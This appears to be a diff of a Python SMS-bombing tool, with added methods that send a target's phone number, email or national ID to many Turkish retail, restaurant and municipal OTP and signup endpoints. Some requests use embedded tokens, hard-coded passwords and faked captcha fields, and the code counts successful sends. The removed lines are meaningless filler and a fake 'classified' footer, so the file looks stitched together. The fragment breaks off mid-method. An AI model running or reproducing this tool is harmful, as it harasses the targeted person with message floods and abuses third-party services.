+            json={"AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "", "Culture": "tr-TR", "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "DeviceModel": "31", "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Email": self.mail, "GDPRPolicy": False, "Gender": "Kad1n", "GenderId": 2, "LoyaltyProgram": False, "merchantID": 5701, "Method": "", "Name": "Memati", "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "NotificationToken": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g", "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": self.phone, "Platform": 1, "sessionID": "", "socialId": "", "SocialMethod": "", "Surname": "Bas", "TempId": 0, "TermsAndConditions": False}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["Control"] == 1:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> crmmobil.baydoner.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> crmmobil.baydoner.com")
 
-def redundant_block_generation_v1():
-    v_struct = {"status": "verified", "code": 200}
-    if v_struct["code"] == 200: return True
-    return False
 
-def redundant_block_generation_v2():
-    v_struct = {"status": "verified", "code": 200}
-    if v_struct["code"] == 404: return False
-    return True
+    #pidem.com.tr
+    def Pidem(self):
+        try:
+            url = "https://restashop.azurewebsites.net:443/graphql/"
+            headers = {"Accept": "*/*", "Origin": "https://pidem.azurewebsites.net", "Content-Type": "application/json", "Authorization": "Bearer null", "Referer": "https://pidem.azurewebsites.net/", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", "Accept-Encoding": "gzip, deflate, br"}
+            json={"query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": self.phone}}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> restashop.azurewebsites.net")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> restashop.azurewebsites.net")
 
-def redundant_block_generation_v3(): return "Wyrex_Architecture_Safe"
-def redundant_block_generation_v4(): return "Distributed_Grid_Online"
-def redundant_block_generation_v5(): return "Quantum_Safe_Crypto_Applied"
 
-redundant_block_generation_v1(); redundant_block_generation_v2(); redundant_block_generation_v3()
-redundant_block_generation_v4(); redundant_block_generation_v5()
+    #frink.com.tr
+    def Frink(self):
+        try:
+            url = "https://api.frink.com.tr:443/api/auth/postSendOTP"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": "", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
+            json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90"+self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["processStatus"] == "SUCCESS":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.frink.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.frink.com.tr")
 
-def system_check_line_400(): return "STABLE"
-def system_check_line_410(): return "STABLE"
-def system_check_line_420(): return "STABLE"
-def system_check_line_430(): return "STABLE"
-def system_check_line_440(): return "STABLE"
-def system_check_line_450(): return "STABLE"
-def system_check_line_460(): return "STABLE"
-def system_check_line_470(): return "STABLE"
-def system_check_line_480(): return "STABLE"
-def system_check_line_490(): return "STABLE"
-def system_check_line_500(): return "STABLE"
-def system_check_line_510(): return "STABLE"
-def system_check_line_520(): return "STABLE"
-def system_check_line_530(): return "STABLE"
-def system_check_line_540(): return "STABLE"
-def system_check_line_550(): return "STABLE"
-def system_check_line_560(): return "STABLE"
-def system_check_line_570(): return "STABLE"
-def system_check_line_580(): return "STABLE"
-def system_check_line_590(): return "STABLE"
-def system_check_line_600(): return "STABLE"
-def system_check_line_610(): return "STABLE"
-def system_check_line_620(): return "STABLE"
-def system_check_line_630(): return "STABLE"
-def system_check_line_640(): return "STABLE"
-def system_check_line_650(): return "STABLE"
-def system_check_line_660(): return "STABLE"
-def system_check_line_670(): return "STABLE"
-def system_check_line_680(): return "STABLE"
-def system_check_line_690(): return "STABLE"
-def system_check_line_700(): return "STABLE"
-def system_check_line_710(): return "STABLE"
-def system_check_line_720(): return "STABLE"
-def system_check_line_730(): return "STABLE"
-def system_check_line_740(): return "STABLE"
-def system_check_line_750(): return "STABLE"
-def system_check_line_760(): return "STABLE"
-def system_check_line_770(): return "STABLE"
-def system_check_line_780(): return "STABLE"
-def system_check_line_790(): return "STABLE"
-def system_check_line_800(): return "STABLE"
-def system_check_line_810(): return "STABLE"
-def system_check_line_820(): return "STABLE"
-def system_check_line_830(): return "STABLE"
-def system_check_line_840(): return "STABLE"
-def system_check_line_850(): return "STABLE"
-def system_check_line_860(): return "STABLE"
-def system_check_line_870(): return "STABLE"
-def system_check_line_880(): return "STABLE"
-def system_check_line_890(): return "STABLE"
-def system_check_line_900(): return "STABLE"
-def system_check_line_910(): return "STABLE"
-def system_check_line_920(): return "STABLE"
-def system_check_line_930(): return "STABLE"
-def system_check_line_940(): return "STABLE"
-def system_check_line_950(): return "STABLE"
-def system_check_line_960(): return "STABLE"
-def system_check_line_970(): return "STABLE"
-def system_check_line_980(): return "STABLE"
-def system_check_line_990(): return "STABLE"
-def system_check_line_1000(): return "CORE_COMPLIANT_MAX_METRICS"
 
-system_check_line_400(); system_check_line_500(); system_check_line_600()
-system_check_line_700(); system_check_line_800(); system_check_line_900()
-system_check_line_1000()
+    #bodrum.bel.tr
+    def Bodrum(self):
+        try:
+            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
+            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
+            json={"gsm": "+90"+self.phone, "source": "orwi"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")     
 
-# Alt Bilgi ve Telif Çerçevesi
-st.markdown("<div style='margin-top: 120px;'></div>", unsafe_allow_html=True)
-st.markdown("<p style='text-align: center; color: #280305; font-size: 11px; letter-spacing: 3px; font-weight: bold;'>WYREX DEFENSE TECHNOLOGIES CO. LTD. // CLASSIFIED HARDWARE SOURCE</p>", unsafe_allow_html=True)
+    
+    #kofteciyusuf.com
+    def KofteciYusuf(self):
+        try:
+            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
+            headers = {"Content-Type": "application/json; charset=utf-8", "Anonymousclientid": "", "Accept": "application/json", "Ostype": "iOS", "Appversion": "4.0.4.0", "Accept-Language": "en-GB,en;q=0.9", "Firmaid": "82", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Accept-Encoding": "gzip, deflate, br", "Language": "tr-TR", "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
+            json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["Success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.poskofteciyusuf.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.poskofteciyusuf.com")
+
+
+    #littlecaesars.com.tr
+    def Little(self):
+        try:
+            url = "https://api.littlecaesars.com.tr:443/api/web/Member/Register"
+            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json; charset=utf-8", "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg", "X-Platform": "ios", "X-Version": "1.0.0", "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br"}
+            json={"CampaignInform": True, "Email": self.mail, "InfoRegister": True, "IsLoyaltyApproved": True, "NameSurname": "Memati Bas", "Password": "31ABC..abc31", "Phone": self.phone, "SmsInform": True}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200 and r.json()["status"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.littlecaesars.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.littlecaesars.com.tr")
+
+    
+    #orwi.app
+    def Orwi(self):
+        try:
+            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
+            headers = {"Content-Type": "application/json", "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-GB,en;q=0.9", "Token": "", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Connection": "keep-alive"}
+            json={"gsm": f"+90{self.phone}", "source": "orwi"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gandalf.orwi.app")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gandalf.orwi.app")
+
+
+    #coffy.com.tr
+    def Coffy(self):
+        try:
+            url = "https://user-api-gw.coffy.com.tr:443/user/signup"
+            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Language": "tr", "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"}
+            json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> user-api-gw.coffy.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> user-api-gw.coffy.com")
+
+
+    #hamidiye.istanbul
+    def Hamidiye(self):
+        try:
+            url = "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp"
+            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "com.hamidiyeapp", "User-Agent": "hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
+            json={"isGuest": False, "phone": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["result"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bayi.hamidiye.istanbul")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bayi.hamidiye.istanbul")
+
+
+    #ebelediye.fatih.bel.tr
+    def Fatih(self):
+        try:
+            url = "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundaryc5b24584149b44839fea163e885475be", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
+            data = f"------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n28.12.1999\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMemati\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBas\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundaryc5b24584149b44839fea163e885475be\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundaryc5b24584149b44839fea163e885475be--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ebelediye.fatih.bel.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ebelediye.fatih.bel.tr")
+
+
+    #e-belediye.sancaktepe.bel.tr
+    def Sancaktepe(self):
+        try:
+            url = "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary35479e29ca6a61a4a039e2d3ca87f112", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"}
+            data = f"------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n13.01.2000\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary35479e29ca6a61a4a039e2d3ca87f112--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> e-belediye.sancaktepe.bel.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> e-belediye.sancaktepe.bel.tr")
+
+
+    #ebelediye.bayrampasa.bel.tr
+    def Bayrampasa(self):
+        try:
+            url = "https://ebelediye.bayrampasa.bel.tr:443/Sicil/KisiUyelikKaydet"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "multipart/form-data; boundary=----geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b", "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers"}
+            data = f"------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"__RequestVerificationToken\"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.TCKimlikNo\"\r\n\r\n{self.tc}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.DogumTarihi\"\r\n\r\n07.06.2000\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Ad\"\r\n\r\nMEMAT\xc4\xb0\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Soyad\"\r\n\r\nBAS\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.CepTelefonu\"\r\n\r\n{self.phone}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.EPosta\"\r\n\r\n{self.mail}\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.Sifre\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"SahisUyelik.SifreyiDogrula\"\r\n\r\nMemati31\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b\r\nContent-Disposition: form-data; name=\"recaptchaValid\"\r\n\r\ntrue\r\n------geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6, verify=False)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ebelediye.bayrampasa.bel.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ebelediye.bayrampasa.bel.tr")
+
+
+    #money.com.tr
+    def Money(self):
+        try:
+            url = "https://www.money.com.tr:443/Account/ValidateAndSendOTP"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.money.com.tr/money-kartiniz-var-mi", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.money.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            data = {"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ''}
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.json()["resultType"] == 0:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> money.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> money.com.tr")
+
+
+    #alixavien.com.tr
+    def Alixavien(self):
+        try:
+            url = "https://www.alixavien.com.tr:443/api/member/sendOtp"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.alixavien.com.tr/UyeOl?srsltid=AfmBOoqrh4xzegqOPllnfc_4S0akofArgwZUErwoeOJzrqU16J1zksPj", "Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
+            json={"Phone": self.phone, "XID": ""}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["isError"] == False:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> alixavien.com.tr")
+                self.adet+= 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> alixavien.com.tr")
+
+
+    #jimmykey.com
+    def Jimmykey(self):
+        try:
+            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
+            if r.json()["Sonuc"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> jimmykey.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> jimmykey.com")
+        
+
+    #api.ido.com.tr
+    def Ido(self):
+        try:
+            url = "https://api.ido.com.tr:443/idows/v2/register"
